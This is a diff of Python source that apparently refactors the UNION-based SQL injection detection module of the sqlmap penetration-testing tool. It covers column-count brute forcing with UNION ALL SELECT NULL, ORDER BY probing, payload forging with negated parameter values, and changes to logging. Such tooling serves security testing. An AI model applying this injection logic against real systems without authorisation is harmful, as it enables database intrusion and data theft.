@@ -19,35 +19,23 @@ from lib.core.unescaper import unescaper
 from lib.parse.html import htmlParser
 from lib.request.connect import Connect as Request
 
-def __unionPosition(negative=False, falseCond=False):
+def __unionPosition(negative=False, falseCond=False, count=None, comment=None):
     validPayload = None
 
-    if negative or falseCond:
-        negLogMsg = "partial (single entry)"
-    else:
-        negLogMsg = "full"
-
-    infoMsg  = "confirming %s inband sql injection on parameter " % negLogMsg
-    infoMsg += "'%s'" % kb.injParameter
-
-    if negative:
-        infoMsg += " with negative parameter value"
-    elif falseCond:
-        infoMsg += " by appending a false condition after the parameter value"
-
-    logger.info(infoMsg)
+    if count is None:
+        count = kb.unionCount
 
     # For each column of the table (# of NULL) perform a request using
     # the UNION ALL SELECT statement to test it the target url is
     # affected by an exploitable inband SQL injection vulnerability
-    for exprPosition in range(0, kb.unionCount):
+    for exprPosition in range(0, count):
         # Prepare expression with delimiters
         randQuery = randomStr()
         randQueryProcessed = agent.concatQuery("\'%s\'" % randQuery)
         randQueryUnescaped = unescaper.unescape(randQueryProcessed)
 
         # Forge the inband SQL injection request
-        query   = agent.forgeInbandQuery(randQueryUnescaped, exprPosition)
+        query = agent.forgeInbandQuery(randQueryUnescaped, exprPosition, count=count, comment=comment)
         payload = agent.payload(newValue=query, negative=negative, falseCond=falseCond)
 
         # Perform the request
@@ -59,66 +47,59 @@ def __unionPosition(negative=False, falseCond=False):
 
             break
 
-    if isinstance(kb.unionPosition, int):
-        infoMsg  = "the target url is affected by an exploitable "
-        infoMsg += "%s inband sql injection vulnerability " % negLogMsg
-        infoMsg += "on parameter '%s'" % kb.injParameter
-        logger.info(infoMsg)
-    else:
-        warnMsg  = "the target url is not affected by an exploitable "
-        warnMsg += "%s inband sql injection vulnerability " % negLogMsg
-        warnMsg += "on parameter '%s'" % kb.injParameter
-
-        if negLogMsg == "partial":
-            warnMsg += ", sqlmap will retrieve the query output "
-            warnMsg += "through blind sql injection technique"
-
-        logger.warn(warnMsg)
-
     return validPayload
 
-def __unionConfirm(negative=False, falseCond=False):
+def __unionConfirm(count=None, comment=None):
     validPayload = None
 
     # Confirm the inband SQL injection and get the exact column
     # position which can be used to extract data
     if not isinstance(kb.unionPosition, int):
-        validPayload = __unionPosition(negative=negative, falseCond=falseCond)
+        debugMsg = "testing full inband with %s columns" % count
+        logger.debug(debugMsg)
+
+        validPayload = __unionPosition(count=count, comment=comment)
 
         # Assure that the above function found the exploitable full inband
         # SQL injection position
         if not isinstance(kb.unionPosition, int):
-            validPayload = __unionPosition(negative=True)
+            debugMsg = "testing single-entry inband value with %s columns" % count
+            logger.debug(debugMsg)
+
+            validPayload = __unionPosition(negative=True, count=count, comment=comment)
 
             # Assure that the above function found the exploitable partial
             # (single entry) inband SQL injection position with negative
             # parameter validPayload
             if not isinstance(kb.unionPosition, int):
-                validPayload = __unionPosition(falseCond=True)
-
+                # NOTE: disable false condition for the time being, in the
+                # end it produces the same as prepending the original
+                #  parameter value with a minus (negative)
+                #validPayload = __unionPosition(falseCond=True, count=count, comment=comment)
+                #
                 # Assure that the above function found the exploitable partial
                 # (single entry) inband SQL injection position by appending
                 # a false condition after the parameter validPayload
-                if not isinstance(kb.unionPosition, int):
-                    return
-                else:
-                    setUnion(falseCond=True)
+                #if not isinstance(kb.unionPosition, int):
+                #    return None
+                #else:
+                #    setUnion(falseCond=True)
+                return None
             else:
                 setUnion(negative=True)
 
     return validPayload
 
-def __unionTestByNULLBruteforce(comment, negative=False, falseCond=False):
+def __unionTestByNULLBruteforce(comment):
     """
     This method tests if the target url is affected by an inband
     SQL injection vulnerability. The test is done up to 50 columns
     on the target database table
     """
 
-    columns = None
-    query   = agent.prefixQuery("UNION ALL SELECT NULL")
+    query = agent.prefixQuery("UNION ALL SELECT NULL")
 
-    for count in range(0, conf.uCols+1):
+    for count in range(1, conf.uCols+1):
         if kb.dbms == DBMS.ORACLE and query.endswith(" FROM DUAL"):
             query = query[:-len(" FROM DUAL")]
 
@@ -128,19 +109,16 @@ def __unionTestByNULLBruteforce(comment, negative=False, falseCond=False):
         if kb.dbms == DBMS.ORACLE:
             query += " FROM DUAL"
 
-        commentedQuery = agent.suffixQuery(query, comment)
-        payload = agent.payload(newValue=commentedQuery, negative=negative, falseCond=falseCond)
-        test, seqMatcher = Request.queryPage(payload, getSeqMatcher=True)
+        validPayload = __unionConfirm(count, comment)
 
-        if test or seqMatcher >= 0.6:
-            columns = count + 1
-
+        if validPayload:
+            setUnion(count=count)
             break
 
-    return columns
+    return validPayload
 
-def __unionTestByOrderBy(comment, negative=False, falseCond=False):
-    columns     = None
+def __unionTestByOrderBy(comment):
+    columns = None
     prevPayload = ""
 
     for count in range(1, conf.uCols+2):
@@ -151,20 +129,11 @@ def __unionTestByOrderBy(comment, negative=False, falseCond=False):
 
         if seqMatcher >= 0.6:
             columns = count
+            setUnion(count=count)
         elif columns:
             break
 
         prevPayload = payload
-
-    return columns
-
-def __unionTestAll(comment="", negative=False, falseCond=False):
-    columns = None
-
-    if conf.uTech == "orderby":
-        columns = __unionTestByOrderBy(comment, negative=negative, falseCond=falseCond)
-    else:
-        columns = __unionTestByNULLBruteforce(comment, negative=negative, falseCond=falseCond)
 
     return columns
 
@@ -190,32 +159,28 @@ def unionTest():
     logger.info(infoMsg)
 
     validPayload = None
-    columns = None
-    negative = False
-    falseCond = False
 
     for comment in (queries[kb.dbms].comment.query, ""):
-        columns = __unionTestAll(comment)
+        if conf.uTech == "orderby":
+            validPayload = __unionTestByOrderBy(comment)
+        else:
+            validPayload = __unionTestByNULLBruteforce(comment)
 
-        if not columns:
-            negative = True
-            columns = __unionTestAll(comment, negative=negative)
-
-        if not columns:
-            falseCond = True
-            columns = __unionTestAll(comment, falseCond=falseCond)
-
-        if columns:
-            setUnion(comment=comment, count=columns, negative=negative, falseCond=falseCond)
+        if validPayload:
+            setUnion(comment=comment)
 
             break
 
-    if kb.unionCount:
-        validPayload = __unionConfirm(negative=negative, falseCond=falseCond)
+    if isinstance(kb.unionPosition, int):
+        infoMsg  = "the target url is affected by an exploitable "
+        infoMsg += "inband sql injection vulnerability "
+        infoMsg += "on parameter '%s' with %d columns" % (kb.injParameter, kb.unionCount)
+        logger.info(infoMsg)
     else:
-        warnMsg  = "the target url is not affected by an "
-        warnMsg += "inband sql injection vulnerability"
-        logger.warn(warnMsg)
+        infoMsg  = "the target url is not affected by an exploitable "
+        infoMsg += "inband sql injection vulnerability "
+        infoMsg += "on parameter '%s'" % kb.injParameter
+        logger.info(infoMsg)
 
     validPayload = agent.removePayloadDelimiters(validPayload, False)
     setUnion(payload=validPayload)
